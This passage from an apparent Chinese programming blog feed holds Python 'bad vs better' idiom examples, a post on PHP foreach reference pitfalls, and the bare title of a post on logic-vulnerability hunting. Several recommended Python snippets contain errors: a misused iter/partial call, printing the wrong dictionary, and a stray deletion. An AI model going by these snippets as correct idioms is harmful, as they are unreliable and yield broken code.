<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line">blocks = []</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    block = f.read(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> block == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    blocks.append(block)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">blocks = []</span><br><span class="line"><span class="keyword">if</span> block <span class="keyword">in</span> iter(partial(read,<span class="number">32</span>),<span class="string">''</span>):</span><br><span class="line">    blocks.append(block)</span><br><span class="line"><span class="comment">#iter是一个内置函数用来生产迭代器，partial的不断的读入文件中32字节，注意iter引入第二个参数，表示当读入的内容是''的时候，会触发生成器stop</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="函数遍历多出口问题"><a href="#函数遍历多出口问题" class="headerlink" title="函数遍历多出口问题"></a>函数遍历多出口问题</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(seq, target)</span>:</span></span><br><span class="line">    found = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate(seq):</span><br><span class="line">        <span class="keyword">if</span> value == target:</span><br><span class="line">            found = <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"> </span><br><span class="line"><span class="comment">#better(for else结构)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(seq, target)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate(seq):</span><br><span class="line">        <span class="keyword">if</span> value == target:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    print(k)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d.keys():</span><br><span class="line">    <span class="keyword">if</span> k.startswith(<span class="string">'a'</span>):</span><br><span class="line">        <span class="keyword">del</span> d[k]</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历键和值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    print(k, <span class="string">'--&gt;'</span>, d[k])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> d.items():</span><br><span class="line">    print(k,<span class="string">'---&gt;'</span>,v)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>]</span><br><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>]</span><br><span class="line"> </span><br><span class="line">d = dict(zip(names, colors))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典的统计"><a href="#字典的统计" class="headerlink" title="字典的统计"></a>字典的统计</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'red'</span>, <span class="string">'blue'</span>, <span class="string">'green'</span>, <span class="string">'red'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> colors:</span><br><span class="line">    <span class="keyword">if</span> color <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">        d[color] = <span class="number">0</span></span><br><span class="line">    d[color] += <span class="number">1</span></span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#batter</span></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> color <span class="keyword">in</span> colors:</span><br><span class="line">    s[color] = s.get(color,<span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="对序列的值根据元素长度进行分组"><a href="#对序列的值根据元素长度进行分组" class="headerlink" title="对序列的值根据元素长度进行分组"></a>对序列的值根据元素长度进行分组</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">         <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">        d[key] = []</span><br><span class="line">    d[key].append(name)</span><br><span class="line"></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    d.setdefault(key, []).append(name)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">    key = len(name)</span><br><span class="line">    s.setdefault(key, []).append(name)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典遍历倒序"><a href="#字典遍历倒序" class="headerlink" title="字典遍历倒序"></a>字典遍历倒序</h3><ul>
<li><p>python3:(使用popitem)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'matthew'</span>: <span class="string">'blue'</span>, <span class="string">'rachel'</span>: <span class="string">'green'</span>, <span class="string">'raymond'</span>: <span class="string">'red'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> d:</span><br><span class="line">    key, value = d.popitem()</span><br><span class="line">    <span class="keyword">print</span> (key, <span class="string">'--&gt;'</span>, value)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="字典链接"><a href="#字典链接" class="headerlink" title="字典链接"></a>字典链接</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">defaults = &#123;<span class="string">'color'</span>: <span class="string">'red'</span>, <span class="string">'user'</span>: <span class="string">'guest'</span>&#125;</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--user'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--color'</span>)</span><br><span class="line">namespace = parser.parse_args([])</span><br><span class="line">command_line_args = &#123;k:v <span class="keyword">for</span> k, v <span class="keyword">in</span> vars(namespace).items() <span class="keyword">if</span> v&#125;</span><br><span class="line"></span><br><span class="line">d = defaults.copy()</span><br><span class="line">d.update(os.environ)</span><br><span class="line">d.update(command_line_args)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">d = collections.ChainMap(command_line_args, os.environ, defaults)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#关于Python中ChainMap的使用：http://blog.topspeedsnail.com/archives/9726</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用关键字提高代码清晰度"><a href="#使用关键字提高代码清晰度" class="headerlink" title="使用关键字提高代码清晰度"></a>使用关键字提高代码清晰度</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad</span></span><br><span class="line">twitter_search(<span class="string">'@obama'</span>, <span class="keyword">False</span>, <span class="number">20</span>, <span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line">twitter_search(<span class="string">'@obama'</span>, retweets=<span class="keyword">False</span>, numtweets=<span class="number">20</span>, popular=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="展开序列"><a href="#展开序列" class="headerlink" title="展开序列"></a>展开序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="string">'Leo'</span>,<span class="string">'Xin'</span>,<span class="string">'30'</span>,<span class="string">'coder'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">fname = p[<span class="number">0</span>]</span><br><span class="line">lname = p[<span class="number">1</span>]</span><br><span class="line">age = p[<span class="number">2</span>]</span><br><span class="line">email = p[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#better</span></span><br><span class="line">fname,lname,age,email = p</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="交换变量"><a href="#交换变量" class="headerlink" title="交换变量"></a>交换变量</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        print(x)</span><br><span class="line">        t = y</span><br><span class="line">        y = x + y</span><br><span class="line">        x = t</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">print</span> (x)</span><br><span class="line">        x, y = y, x + y</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="更新序列"><a href="#更新序列" class="headerlink" title="更新序列"></a>更新序列</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line">names = [<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">         <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">del</span> names[<span class="number">0</span>]</span><br><span class="line">names.pop(<span class="number">0</span>)</span><br><span class="line">names.insert(<span class="number">0</span>, <span class="string">'mark'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line">names = collections.deque([<span class="string">'raymond'</span>, <span class="string">'rachel'</span>, <span class="string">'matthew'</span>, <span class="string">'roger'</span>,</span><br><span class="line">               <span class="string">'betty'</span>, <span class="string">'melissa'</span>, <span class="string">'judith'</span>, <span class="string">'charlie'</span>])</span><br><span class="line"><span class="keyword">del</span> names[<span class="number">0</span>]</span><br><span class="line">names.popleft()</span><br><span class="line">names.appendleft(<span class="string">'mark'</span>)</span><br><span class="line">print(names)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用collections模块里面的双向队列，会更简洁</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用线程锁"><a href="#使用线程锁" class="headerlink" title="使用线程锁"></a>使用线程锁</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 1'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 2'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 1'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Critical section 2'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="修改for循环语句"><a href="#修改for循环语句" class="headerlink" title="修改for循环语句"></a>修改for循环语句</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    s = i ** <span class="number">2</span></span><br><span class="line">    result.append(s)</span><br><span class="line"><span class="keyword">print</span> (sum(result))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Better</span></span><br><span class="line"><span class="keyword">print</span> (sum(i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)))</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>foreach的一些小坑</title>
    <url>/2018/09/29/foreach%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91/</url>
    <content><![CDATA[<h3 id="PHP-foreach的一些小坑"><a href="#PHP-foreach的一些小坑" class="headerlink" title="PHP-foreach的一些小坑"></a>PHP-foreach的一些小坑</h3><blockquote>
<p>再PHP中，foreach是对数组遍历的一个方法，遍历也只用于数组，在编程的时候有一些小坑，记录如下。</p>
</blockquote>
<h4 id="foreach的两种语法结构"><a href="#foreach的两种语法结构" class="headerlink" title="foreach的两种语法结构"></a>foreach的两种语法结构</h4><ol>
<li><p>只遍历引用值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    　　statement</span><br><span class="line">    </span><br><span class="line"><span class="comment">//示例：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//显示结果：</span></span><br><span class="line"><span class="number">1234</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历引用键和值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">  　　  statement</span><br><span class="line">  　　  </span><br><span class="line"><span class="comment">//示例：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"[$key] =&gt; $value\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[$key] =&gt; $value"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line">[<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">[<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">[<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">[<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>] =&gt; <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="在foreach中是否使用-amp-的区别："><a href="#在foreach中是否使用-amp-的区别：" class="headerlink" title="在foreach中是否使用&amp;的区别："></a>在foreach中是否使用&amp;的区别：</h4><ol>
<li><p>不使用&amp;，foreach的作用域只在当前循环中，不会改变外部数组的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	$value = $value * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">8</span> </span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用&amp;会使得作用域扩大到对应的数组，改变数组的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	$value = $value * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">8</span> </span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">4</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">8</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="在foreach中是否使用-amp-的坑点："><a href="#在foreach中是否使用-amp-的坑点：" class="headerlink" title="在foreach中是否使用&amp;的坑点："></a>在foreach中是否使用&amp;的坑点：</h4><ol>
<li><p>这里和上面的作用域联系起来，没使用以后不会影响数组本身，所以两次foreach的结果互不影响：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="comment">// $value = $value * 2;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用以后改变了作用域，这里&amp;指向第一次foreach的最后一个地址，在PHP中它不会自动释放该地址：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="comment">// $value = $value * 2;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> </span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看它每次具体的变化：(这里可以验证每次改变的是&amp;指向的最后一个地址)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;&#125;</span><br><span class="line">;</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&#123;$key&#125; =&gt; &#123;$value&#125; "</span>;</span><br><span class="line">	print_r($arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"><span class="number">0</span> =&gt; <span class="number">1</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"><span class="number">1</span> =&gt; <span class="number">2</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"><span class="number">2</span> =&gt; <span class="number">3</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="number">3</span> =&gt; <span class="number">3</span> <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>解决方法：在每次foreach后unset解除&amp;的指定关系，或者在每次遍历中使用不同的变量名：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($value);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">//使用不同的变量名</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $val) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$val "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑漏洞挖掘学习总结</title>
    <url>/2018/09/17/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
